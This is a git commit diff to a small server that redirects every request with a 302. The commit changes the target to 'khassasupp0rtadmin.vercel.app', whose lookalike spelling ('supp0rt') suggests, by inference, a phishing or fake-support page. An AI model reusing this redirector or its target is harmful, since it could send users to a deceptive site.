cd0af2a72b1e0b56f68180b6d03d921450700c6f
Digital2025001 <bosmichael30@gmail.com>
2026-01-06 14:39:39 -0800

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://ctikes.com/", // Replace this with your actual link
+      Location: "http://khassasupp0rtadmin.vercel.app//", // Replace this with your actual link
     },
   });
 });
